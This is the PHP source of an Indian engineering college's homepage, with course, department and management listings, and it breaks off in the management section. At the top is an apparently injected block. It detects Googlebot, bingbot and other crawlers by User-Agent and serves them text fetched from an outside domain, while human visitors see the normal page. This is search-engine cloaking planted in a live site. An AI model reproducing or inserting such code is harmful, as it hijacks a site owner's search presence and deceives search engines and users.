<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) {
    $message = file_get_contents('https://amp-saya.com/brand/www.smcet.edu.in/index.txt');
    echo $message;
exit; // Atau bisa menggunakan die()
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <title>SMCET - St. Michael College of Engineering & Technology, Kalayarkoil, Sivagangai District, Tamil Nadu, India.</title>
  <meta charset="utf-8">
  <meta name="description" content="St. Michael College of Engineering and Technology is specialized in providing comprehensive education in the academic fields of Engineering, Technology and Management." />
  <meta name="keywords" content="Top engineering college in Tamil nadu, Leading engineering college in tamilnadu, top 10 college in tamilnadu, St. Michael college of Engineering and Technology, Smcet, Top college in Tamil Nadu, St. Michael College of Engineering and Technology, Kalayar koil, Sivagangai district, Tamil Nadu" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <!-- FAVICONS ICON ============================================= -->
  <link rel="icon" href="images/college/favicon.ico" type="image/x-icon" />
  <link rel="shortcut icon" type="image/x-icon" href="images/college/favicon.png" />
  <link href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,500,600,700,800,900&display=swap" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
  <link rel="stylesheet" href="css/open-iconic-bootstrap.min.css">
  <link rel="stylesheet" href="css/animate.css">
  <link rel="stylesheet" href="css/owl.carousel.min.css">
  <link rel="stylesheet" href="css/owl.theme.default.min.css">
  <link rel="stylesheet" href="css/magnific-popup.css">
  <link rel="stylesheet" href="css/aos.css">
  <link rel="stylesheet" href="css/ionicons.min.css">
  <link rel="stylesheet" href="css/flaticon.css">
  <link rel="stylesheet" href="css/icomoon.css">
  <link rel="stylesheet" href="css/style.css">
  <style>
    #customers {
      font-family: Arial, Helvetica, sans-serif;
      border-collapse: collapse;
      width: 80%;
    }

    #customers td,
    #customers th {
      border: 1px solid #ddd;
      padding: 8px;
    }

    #customers tr:nth-child(even) {
      background-color: #f2f2f2;
    }

    #customers tr:hover {
      background-color: #ddd;
    }

    #customers th {
      padding-top: 12px;
      padding-bottom: 12px;
      text-align: left;
      background-color: #04AA6D;
      color: white;
    }
  </style>
  <style media="screen, tv, projection" type="text/css">
    @import "css/style.css";

    #dvLoading {
      background: #000 url(images/smcetnaac.jpg) no-repeat center center;
      height: 100px;
      width: 100px;
      position: fixed;
      z-index: 1000;
      left: 30%;
      top: 30%;
      margin: -25px 0 0 -25px;
    }

    /* popup_box DIV-Styles*/
    #popup_box {
      display: none;
      /* Hide the DIV */
      position: fixed;
      _position: absolute;
      /* hack for internet explorer 6 */
      height: 460px;
      width: 290px;
      background: #FFFFFF;
      top: 20%;
      left: 1%;
      z-index: 100;
      /* Layering ( on-top of others), if you have lots of layers: I just maximized, you can change it yourself */
      margin: 0 auto;
      min-height: 200px;
      min-width: 380px;
      /* additional features, can be omitted */
      border: 1px solid #1d5ca9;
      padding: 9px;
      font-size: 15px;
      overflow: hidden;
      -moz-box-shadow: 0 0 5px #1d5ca9;
      -webkit-box-shadow: 0 0 5px #1d5ca9;
      box-shadow: 0 0 5px #1d5ca9;
    }

    a {
      cursor: pointer;
      text-decoration: none;
    }

    /* This is for the positioning of the Close Link */
    #popupBoxClose {
      font-size: 20px;
      line-height: 15px;
      right: 0px;
      top: -1px;
      position: absolute;
      color: #6fa5e2;
      font-weight: 500;
    }
  </style>
  <script type="text/javascript" src="js/jquery.min.js"></script>
  <script type="text/javascript" src="js/scrolltopcontrol.js"></script>
  <script type="text/javascript" src="js/over.js"></script>
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-30327284-1']);
    _gaq.push(['_trackPageview']);
    (function() {
      var ga = document.createElement('script');
      ga.type = 'text/javascript';
      ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(ga, s);
    })();
  </script>
  <script type="text/javascript">
    function openWin(img) {
      var path = "images/"
      window.open(path + img, "mywin", "titlebar='no',menubar=0,resizable=1,location=0,height=350,width=480,left=500,top=200,")
    }
  </script>
  <script>
    $(window).load(function() {
      $('#dvLoading').fadeOut(20000);
    });
  </script>
  <script type="text/javascript">
    $(document).ready(function() {
      // When site loaded, load the Popupbox First
      loadPopupBox();
      $('#popupBoxClose').click(function() {
        unloadPopupBox();
      });
      $('#container').click(function() {
        unloadPopupBox();
      });

      function unloadPopupBox() { // TO Unload the Popupbox
        $('#popup_box').fadeOut("slow");
        $("#container").css({ // this is just for style		
          "opacity": "1"
        });
      }

      function loadPopupBox() { // To Load the Popupbox
        $('#popup_box').fadeIn("slow");
        $("#container").css({ // this is just for style
          "opacity": "0.6"
        });
      }
      /**********************************************************/
      var currentDt = new Date();
      var mm = currentDt.getMonth() + 1;
      mm = (mm < 10) ? '0' + mm : mm;
      var dd = currentDt.getDate();
      dd = (dd < 10) ? '0' + dd : dd;
      var yyyy = currentDt.getFullYear();
      var date = dd + '/' + mm + '/' + yyyy;
      var d = new Date(yyyy, mm, dd);
      var d1 = new Date(2015, 10, 08);
      if (d < d1) document.getElementById('time610').innerHTML = '<img src="images/new.gif"></img>';
      var d2 = new Date(2015, 10, 01);
      if (d < d2) document.getElementById('time2').innerHTML = '<img src="images/new.gif"></img>';
      var d3 = new Date(2015, 09, 29);
      if (d < d3) document.getElementById('time3').innerHTML = '<img src="images/new.gif"></img>';
    });
  </script>
</head>

<body>
  <!-- JavaScript Bundle with Popper -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
  <div class="bg-top navbar-light">
    <div class="container">
      <div class="row no-gutters d-flex align-items-center align-items-stretch">
        <div class="col-md-6 d-flex align-items-center py-1">
          <a class="navbar-brand" href="index.php"><img src="images/college/collegetitlet.jpg" width="100%" /></a>
        </div>
        <div class="col-lg d-block">
          <div class="row d-flex">
            <div class="col-md-4 d-flex topper align-items-right align-items-stretch py-md-4">
              <div class="icon d-flex justify-content-center align-items-center"><span class="icon-paper-plane"></span></div>
              <div class="text">
                <span>Email</span>
                <span><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="721b1c141d32011f1117065c1716075c1b1c">[email&#160;protected]</a></span>
                <span><a href="pdf/nirf.pdf" target="_blank"><img src="images/nirf.jpg" height="20" widthy="30"></a></span>
                <span><a href="https://www.smcet.edu.in/cms/" target="_blank"><img src="images/cms.jpg" height="20" widthy="30"></a></span>
                <span><a href="https://discovery.delnet.in/" target="_blank"><img src="images/delnet.jpg" height="20" widthy="30"></a></span>
              </div>
            </div>
            <div class="col-md-4 d-flex topper align-items-center align-items-stretch py-md-4">
              <div class="icon d-flex justify-content-center align-items-center"><span class="icon-phone2"></span></div>
              <div class="text">
                <span>Call</span>
                <span>+91 99427 96723</span>
                <span>+91 99427 96746</span>
                <span><a href="https://www.smcet.edu.in/naac/naacsf.php" target="_blank"><img src="images/feed.jpg" height="20" widthy="20"></a></span>
              </div>
            </div>
            <div class="col-md-4 topper d-flex align-items-center justify-content-end">
              <p class="mb-0">
                <a href="#" class="btn py-2 px-3 btn-primary d-flex align-items-center justify-content-center rounded-circle">
                  <span><img src="../../images/ccsmcet.gif" height="40%" class="rounded-circle" />Apply Now</span>
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <nav class="navbar navbar-expand-lg navbar-dark bg-dark ftco-navbar-light" id="ftco-navbar">
    <div class="container d-flex align-items-center px-4">
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#ftco-nav" aria-controls="ftco-nav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="oi oi-menu"></span> Menu </button>
      <div class="collapse navbar-collapse" id="ftco-nav">
        <ul class="navbar-nav mr-auto">
          <li class="nav-item active"><a href="index.php" class="nav-link pl-0">Home</a></li>
          <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">About Us</a>
            <div class="dropdown-menu">
              <a class="dropdown-item bg-light" href="aboutus/index.php">Mission & Vision</a>
              <a class="dropdown-item bg-light" href="aboutus/founder.php">Our Founder</a>
              <a class="dropdown-item bg-light" href="aboutus/chairman.php">Chairman's Message</a>
              <a class="dropdown-item bg-light" href="aboutus/secratory.php">Secretary's Profile</a>
              <a class="dropdown-item bg-light" href="aboutus/ceo.php">CEO's Message</a>
              <a class="dropdown-item bg-light" href="aboutus/principal.php">Principal's Profile</a>
            </div>
          </li>
          <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Academic</a>
            <div class="dropdown-menu">
              <a class="dropdown-item bg-light" href="courses.php">Programs Offered</a>
              <div class="dropdown-divider"></div>
              <a class="dropdown-item bg-light" href="tstaff.php">Teaching Staff</a>
              <a class="dropdown-item bg-light" href="ntstaff.php">Non-Teaching Staff</a>
            </div>
          </li>
          <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Campus Life</a>
            <div class="dropdown-menu">
              <a class="dropdown-item bg-light" href="campus/infra.php" title="Infrastructure">Infrastructure</a>
              <a class="dropdown-item bg-light" href="campus/internet.php" title="Internet Facility">Internet Facility</a>
              <a class="dropdown-item bg-light" href="campus/hostels.php" title="Hostels">Hostels</a>
              <a class="dropdown-item bg-light" href="campus/library.php" title="Library">Library</a>
              <a class="dropdown-item bg-light" href="campus/association.php" title="Association Activities">Association Activities</a>
              <a class="dropdown-item bg-light" href="campus/chapel.php" title="Chapel">Chapel</a>
              <a class="dropdown-item bg-light" href="campus/transport.php" title="Transportation">Transportation</a>
              <a class="dropdown-item bg-light" href="campus/computer.php" title="Computer Lab">Computer Lab</a>
              <a class="dropdown-item bg-light" href="campus/sports.php" title="Sports & Games">Sports & Games</a>
            </div>
          </li>
          <li class="nav-item"><a href="placement/index.php" class="nav-link">Placement</a></li>
          <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" aria-expanded="false" aria-expanded="false" aria-expanded="false">NAAC</a>
            <div class="dropdown-menu">
              <a class="dropdown-item bg-light" href="iqac/index.php">IQAC</a>
              <a class="dropdown-item bg-light" href="naac/index.php">NAAC</a>
              <a class="dropdown-item bg-light" href="rtiact/index.php">RTI</a>
            </div>
          </li>
          <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" aria-expanded="false" aria-expanded="false" aria-expanded="false">Committees</a>
            <div class="dropdown-menu">
              <a class="dropdown-item bg-light" href="antiragging.php">Anti-Ragging Committee</a>
              <a class="dropdown-item bg-light" href="icc.php">Internal Complaints Committee</a>
              <a class="dropdown-item bg-light" href="scst.php">SC/ST Committee</a>
              <a class="dropdown-item bg-light" href="grc.php">Grievance Redressal Committee</a>
            </div>
          </li>
          <li class="nav-item"><a href="contactus.php" class="nav-link">Contact Us</a></li>
          <li class="nav-item dropdown"><a class="nav-link dropdown-toggle" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">ERP Login</a>
            <div class="dropdown-menu">
              <a class="dropdown-item bg-light" href="login.php" target="_blank">Faculty</a>
              <a class="dropdown-item bg-light" href="smceteduerp/index.php" target="_blank">Student</a>
              <a class="dropdown-item bg-light" href="techcampus/index.php" target="_blank">Department</a>
            </div>
          </li>
      </div>
    </div>
  </nav>
  <!-- END nav -->
  <!-- END nav -->
  <div>
    <marquee scrolldelay="200"><a href="https://smcet.edu.in/iqac/iqacnptvd.php" target="_blank">Video - NAAC PEER TEAM on 25-04-2024 & 26-04-2024 </a></marquee>
  </div>
  <div id="popup_box" style="display: block;">
    <img alt="Counselling Code" src="images/rank.jpg" width="100%" height="100%" />
    <a id="popupBoxClose"><img alt="Close" src="images/minus.png" /></a>
  </div>
  <section class="home-slider owl-carousel">
    <div class="slider-item" style="background-image:url(images/college/bg_1.jpg);">
      <div class="overlay"></div>
      <div class="container">
        <div class="row no-gutters slider-text align-items-center justify-content-start" data-scrollax-parent="true">
          <div class="col-md-6 ftco-animate">
            <h1 class="mb-4">Education Needs Complete Solution</h1>
            <p>Education is a never-ending source of knowledge, and our goal is to provide everyone with a great education.</p>
            <p><a href="contact.php" class="btn btn-primary px-4 py-3 mt-3">Contact Us</a></p>
          </div>
        </div>
      </div>
    </div>
    <div class="slider-item" style="background-image:url(images/college/bg_2.jpg);">
      <div class="overlay"></div>
      <div class="container">
        <div class="row no-gutters slider-text align-items-center justify-content-start" data-scrollax-parent="true">
          <div class="col-md-6 ftco-animate">
            <h1 class="mb-4">St. Michael College of Engineering & Technology</h1>
            <p>Education is a never-ending source of knowledge, and our goal is to provide everyone with a great education.</p>
            <p><a href="contact.php" class="btn btn-primary px-4 py-3 mt-3">Contact Us</a></p>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section class="ftco-services ftco-no-pb">
    <div class="container-wrap">
      <div class="row no-gutters">
        <div class="col-md-3 d-flex services align-self-stretch py-5 px-4 ftco-animate bg-primary">
          <div class="media block-6 d-block text-center">
            <div class="icon d-flex justify-content-center align-items-center">
              <span class="flaticon-teacher"></span>
            </div>
            <div class="media-body p-2 mt-3">
              <h3 class="heading">Qualified Faculties</h3>
              <p align="justify"> SMCET boasts a highly qualified and experienced faculty who inspire students to excel in their fields. They provide comprehensive knowledge, guidance, and support in theory, practical work, and other academic activities. The success of SMCET is directly attributed to our dedicated and skilled faculty.</p>
            </div>
          </div>
        </div>
        <div class="col-md-3 d-flex services align-self-stretch py-5 px-4 ftco-animate bg-darken">
          <div class="media block-6 d-block text-center">
            <div class="icon d-flex justify-content-center align-items-center">
              <span class="flaticon-reading"></span>
            </div>
            <div class="media-body p-2 mt-3">
              <h3 class="heading">Outcome-Based Education</h3>
              <p>Outcome-Based Education (OBE) is an approach that prioritizes specific learning outcomes, fostering authentic disciplinary behaviors in students. It organizes curriculum, instruction, and assessment to ensure effective attainment of these outcomes.</p>
            </div>
          </div>
        </div>
        <div class="col-md-3 d-flex services align-self-stretch py-5 px-4 ftco-animate bg-primary">
          <div class="media block-6 d-block text-center">
            <div class="icon d-flex justify-content-center align-items-center">
              <span class="flaticon-books"></span>
            </div>
            <div class="media-body p-2 mt-3">
              <h3 class="heading">Book &amp; Library</h3>
              <p>The SMCET Library is the institution's knowledge hub, acquiring, processing, preserving, and sharing information with the user community. We actively involve students and faculty in recommending new books, enriching our collection.</p>
            </div>
          </div>
        </div>
        <div class="col-md-3 d-flex services align-self-stretch py-5 px-4 ftco-animate bg-darken">
          <div class="media block-6 d-block text-center">
            <div class="icon d-flex justify-content-center align-items-center">
              <span class="flaticon-diploma"></span>
            </div>
            <div class="media-body p-2 mt-3">
              <h3 class="heading">Active Clubs</h3>
              <p>SMCET offers dynamic clubs that expose students to a variety of co-curricular and extra-curricular activities. These clubs facilitate skill development in programming, entrepreneurship, and more, providing networking opportunities, skill enhancement, teamwork, support systems, and a break from academics.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section class="ftco-section ftco-no-pt ftc-no-pb">
    <div class="container">
      <div class="row d-flex">
        <div class="col-md-5 order-md-last wrap-about wrap-about d-flex align-items-stretch">
          <div class="img" style="background-image: url(images/college/about.jpg); border"></div>
        </div>
        <div class="col-md-7 wrap-about py-5 pr-md-4 ftco-animate">
          <h2 class="mb-4">Rebuilding Tech Education</h2>
          <p>SMCET's mission extends beyond technical knowledge. We strive to cultivate graduates with a deep understanding of science and technology, coupled with critical thinking, effective communication, empathetic leadership, and innovative problem-solving abilities for global challenges.</p>
          <div class="row mt-5">
            <div class="col-lg-6">
              <div class="services-2 d-flex">
                <div class="icon mt-2 d-flex justify-content-center align-items-center"><span class="flaticon-security"></span></div>
                <div class="text pl-3">
                  <h3>Safety First</h3>
                  <p>Nothing we do at SMCET is more important than assuring the Health & Safety of our personnel and the protection of environmental resources.</p>
                </div>
              </div>
            </div>
            <div class="col-lg-6">
              <div class="services-2 d-flex">
                <div class="icon mt-2 d-flex justify-content-center align-items-center"><span class="flaticon-reading"></span></div>
                <div class="text pl-3">
                  <h3>Regular Classes</h3>
                  <p>Students are expected to attend a minimum number of credit hours toward their final degree, which should be completed within a predetermined timeframe of months or years.</p>
                </div>
              </div>
            </div>
            <div class="col-lg-6">
              <div class="services-2 d-flex">
                <div class="icon mt-2 d-flex justify-content-center align-items-center"><span class="flaticon-diploma"></span></div>
                <div class="text pl-3">
                  <h3>Placements</h3>
                  <p>SMCET offers various placement opportunities to help students build a bright future. Our placement cell provides counseling, training, and value additions to ensure students are ready for placements in reputed organizations.</p>
                </div>
              </div>
            </div>
            <div class="col-lg-6">
              <div class="services-2 d-flex">
                <div class="icon mt-2 d-flex justify-content-center align-items-center"><span class="flaticon-education"></span></div>
                <div class="text pl-3">
                  <h3>Sufficient Infrastructures</h3>
                  <p>SMCET, situated in Kalayarkoil, boasts ample infrastructure facilities including a digital library, hostel, canteen, and post office.</p>
                </div>
              </div>
            </div>
            <div class="col-lg-6">
              <div class="services-2 d-flex">
                <div class="icon mt-2 d-flex justify-content-center align-items-center"><span class="flaticon-jigsaw"></span></div>
                <div class="text pl-3">
                  <h3>Creative Lessons</h3>
                  <p>Fostering creativity can range from simple team-building exercises to complex, open-ended problems that may require a semester to solve.</p>
                </div>
              </div>
            </div>
            <div class="col-lg-6">
              <div class="services-2 d-flex">
                <div class="icon mt-2 d-flex justify-content-center align-items-center"><span class="flaticon-kids"></span></div>
                <div class="text pl-3">
                  <h3>Sports Facilities</h3>
                  <p>Sports play an important role in the physical development of the students. Equal emphasis is laid on sports and games along with academics. </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section class="ftco-section ftco-counter img" id="section-counter" style="background-image: url(images/college/bg_3.jpg);" data-stellar-background-ratio="0.5">
    <div class="container">
      <div class="row justify-content-center mb-5 pb-2 d-flex">
        <div class="col-md-6 align-items-stretch d-flex">
          <div class="img img-video d-flex align-items-center" style="background-image: url(images/college/about-2.jpg);">
            <div class="video justify-content-center">
              <a href="https://smcet.edu.in/images/smcet.mp4" class="icon-video popup-vimeo d-flex justify-content-center align-items-center">
                <span class="ion-ios-play"></span>
              </a>
            </div>
          </div>
        </div>
        <div class="col-md-6 heading-section heading-section-white ftco-animate pl-lg-5 pt-md-0 pt-5">
          <h2 class="mb-4">SMCET</h2>
          <p>St. Michael College of Engineering & Technology was established in the year 1998 by St. Michael Educational and Charitable Trust founded by Late Ln. Dr. V. Michael, B.E., M.I.S.T.E., Ph.D (USA). The college is approved by AICTE, New Delhi and affiliated to Anna University.</p>
          <p>The college offers a distinctly collaborative educational experience with a strong emphasis on practical orientation, research, and industry linkages. The educational process at SMCET aims to provide a holistic learning experience for the students.</p>
        </div>
      </div>
      <div class="row d-md-flex align-items-center justify-content-center">
        <div class="col-lg-12">
          <div class="row d-md-flex align-items-center">
            <div class="col-md d-flex justify-content-center counter-wrap ftco-animate">
              <div class="block-18">
                <div class="icon"><span class="flaticon-doctor"></span></div>
                <div class="text">
                  <strong class="number" data-number="25">0</strong>
                  <span>Years of Sevrice</span>
                </div>
              </div>
            </div>
            <div class="col-md d-flex justify-content-center counter-wrap ftco-animate">
              <div class="block-18">
                <div class="icon"><span class="flaticon-doctor"></span></div>
                <div class="text">
                  <strong class="number" data-number="7426">0</strong>
                  <span>Graduates</span>
                </div>
              </div>
            </div>
            <div class="col-md d-flex justify-content-center counter-wrap ftco-animate">
              <div class="block-18">
                <div class="icon"><span class="flaticon-doctor"></span></div>
                <div class="text">
                  <strong class="number" data-number="702">0</strong>
                  <span>Students</span>
                </div>
              </div>
            </div>
            <div class="col-md d-flex justify-content-center counter-wrap ftco-animate">
              <div class="block-18">
                <div class="icon"><span class="flaticon-doctor"></span></div>
                <div class="text">
                  <strong class="number" data-number="108">0</strong>
                  <span>Staff</span>
                </div>
              </div>
            </div>
            <div class="col-md d-flex justify-content-center counter-wrap ftco-animate">
              <div class="block-18">
                <div class="icon"><span class="flaticon-doctor"></span></div>
                <div class="text">
                  <strong class="number" data-number="127">0</strong>
                  <span>University Ranks</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section class="ftco-section">
    <div class="container-fluid px-4">
      <div class="row justify-content-center mb-5 pb-2">
        <div class="col-md-8 text-center heading-section ftco-animate">
          <h2 class="mb-4"><span>Our</span> Departments</h2>
          <p>SMCET has ten academic departments and offers 8 undergraduate and 3 postgraduate engineering and technology programs, as well as 1 MBA program. The departments work together to deliver a world-class technical education.</p>
        </div>
      </div>
      <div class="row">
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-1.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>UG & PG</span>
              <span><i class="icon-table mr-2"></i>2002</span>
              <span><i class="icon-calendar mr-2"></i>4 & 2 Yrs</span>
            </p>
            <h3><a href="courses.php">Biotechnology</a></h3>
            <p>The department of Biotechnology was started in the year 2002 with B.Tech programme in Biotechnology. Annually 60 students are admitted in this program. The department has also started M.Tech in Biotechnolgy from the academic session 2010-11 with an intake of 18 students.</p>
            <p><a href="courses.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-3.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>UG & PG</span>
              <span><i class="icon-table mr-2"></i>1998</span>
              <span><i class="icon-calendar mr-2"></i>4 & 2 Yrs</span>
            </p>
            <h3><a href="courses.php">Biomedical Engineering</a></h3>
            <p>The department of Biomedical Engineering was started in the year 2023 with B.E programme in Biomedical Engineering. Annually, 30 students are admitted in B.E – BME. </p>
            <p><a href="courses.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-2.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>UG</span>
              <span><i class="icon-table mr-2"></i>1998</span>
              <span><i class="icon-calendar mr-2"></i>4 Years</span>
            </p>
            <h3><a href="courses.php">Chemical Engineering</a></h3>
            <p>The department of Chemical Engineering was started in the year 1998 and presently offers a four year B.Tech programme in Chemical Engineering.Annually 30 students are admitted in this program.</p>
            <p><a href="courses.php" class="btn btn-primary">visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-3.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>UG & PG</span>
              <span><i class="icon-table mr-2"></i>1998</span>
              <span><i class="icon-calendar mr-2"></i>4 & 2 Yrs</span>
            </p>
            <h3><a href="courses.php">Computer Sci. and Engg.</a></h3>
            <p>The department of Computer Science and Engineering was started in the year 1998 with B.E programme in Computer Science and Engineering. Annually, 60 students are admitted in B.E – CSE. The department has also started M.E in Computer Science and Engineering from the academic year 2010-11 with an intake of 18 students.</p>
            <p><a href="courses.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-3.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>UG & PG</span>
              <span><i class="icon-table mr-2"></i>1998</span>
              <span><i class="icon-calendar mr-2"></i>4 & 2 Yrs</span>
            </p>
            <h3><a href="courses.php">CSE(Artificial Intelligence and Machine Learning).</a></h3>
            <p>The department of Computer Science and Engineering was started in the year 2023 with B.E programme in CSE(Artificial Intelligence and Machine Learning. Annually, 60 students are admitted in B.E – CSE(AI&ML). </p>
            <p><a href="courses.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-4.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>UG</span>
              <span><i class="icon-table mr-2"></i>2012</span>
              <span><i class="icon-calendar mr-2"></i>4 Years</span>
            </p>
            <h3><a href="courses.php">Mechanical Engineering</a></h3>
            <p>The department of Mechanical Engineering was established in the year 2012 with an intake of 30 students. The objective of the department is to produce high caliber technocrats and eminent Mechanical Engineers. </p>
            <p><a href="courses.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-5.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>UG & PG</span>
              <span><i class="icon-table mr-2"></i>1998</span>
              <span><i class="icon-calendar mr-2"></i>4 & 2 Yrs</span>
            </p>
            <h3><a href="courses.php">Electronics & Com. Engg.</a></h3>
            <p>The department of Electronics and Communication Engineering was started in the year 1998. Annually, 60 students are admitted in B.E–ECE. The department has started a new program M.E in Communication Systems from the academic year 2012-13 with an intake of 18 students.</p>
            <p><a href="courses.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-6.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>UG & PG</span>
              <span><i class="icon-table mr-2"></i>2002</span>
              <span><i class="icon-calendar mr-2"></i>4 & 2 Yrs</span>
            </p>
            <h3><a href="courses.php">Electrical & Elect. Engg.</a></h3>
            <p>The department of Electrical and Electronics Engineering was started in the year 2002. Annually, 30 students are admitted in B.E - EEE.</p>
            <p><a href="courses.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-7.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>PG</span>
              <span><i class="icon-table mr-2"></i>2007</span>
              <span><i class="icon-calendar mr-2"></i>2 Yrs</span>
            </p>
            <h3><a href="courses.php">Master of Buss. Admin.</a></h3>
            <p> SMCET has started the Department of Management Studies in the year 2007. The program is being offered in affiliation with Anna University. The Department has got AICTE approval to offer 60 seats at present.</p>
            <p><a href="courses.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
        <div class="col-md-3 course ftco-animate">
          <div class="img" style="background-image: url(images/college/course-8.jpg);"></div>
          <div class="text pt-4">
            <p class="meta d-flex">
              <span><i class="icon-user mr-2"></i>S&H</span>
              <span><i class="icon-table mr-2"></i>1998</span>
              <span><i class="icon-calendar mr-2"></i>24 Staff</span>
            </p>
            <h3><a href="sandh/index.php">Science and Humanities</a></h3>
            <p>The Department of Science and Humanities consists of Chemistry, Physics, Mathematics and English disciplines. All the disciplines in the department exist as a separate division and maintain individual identity. </p>
            <p><a href="sandh/index.php" class="btn btn-primary">Visit now</a></p>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section class="ftco-section bg-light">
    <div class="container-fluid px-4">
      <div class="row justify-content-center mb-5 pb-2">
        <div class="col-md-8 text-center heading-section ftco-animate">
          <h2 class="mb-4">Our Management</h2>
          <p>Education is a never-ending source of knowledge, and our goal is to provide everyone with a great education.</p>
        </div>
      </div>
      <div class="row">
        <div class="col-md-6 col-lg-4 ftco-animate">
          <div class="staff">
            <div class="img-wrap d-flex align-items-stretch">
              <div class="img align-self-stretch" style="background-image: url(images/college/teacher-3.jpg);"></div>
            </div>
            <div class="text pt-3 text-center">
              <h3>Ln. Dr. M. Stalin Arockiaraj</h3>
              <span class="position mb-2">Chairman</span>
              <div class="faded">
                <p></p>
                <ul class="ftco-social text-center">
                  <li class="ftco-animate"><a href="#"><span class="icon-twitter"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-facebook"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-google-plus"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-instagram"></span></a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 ftco-animate">
          <div class="staff">
            <div class="img-wrap d-flex align-items-stretch">
              <div class="img align-self-stretch" style="background-image: url(images/college/teacher-2.jpg);"></div>
            </div>
            <div class="text pt-3 text-center">
              <h3>LN. Mrs. M. Fatima Mary</h3>
              <span class="position mb-2">Secretary</span>
              <div class="faded">
                <p></p>
                <ul class="ftco-social text-center">
                  <li class="ftco-animate"><a href="#"><span class="icon-twitter"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-facebook"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-google-plus"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-instagram"></span></a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 ftco-animate">
          <div class="staff">
            <div class="img-wrap d-flex align-items-stretch">
              <div class="img align-self-stretch" style="background-image: url(images/college/teacher-6.jpg);"></div>
            </div>
